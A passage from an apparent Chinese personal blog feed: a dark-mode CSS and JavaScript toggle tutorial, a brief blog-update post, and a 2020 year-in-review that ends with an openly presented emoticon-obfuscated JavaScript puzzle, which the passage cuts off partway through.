href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - 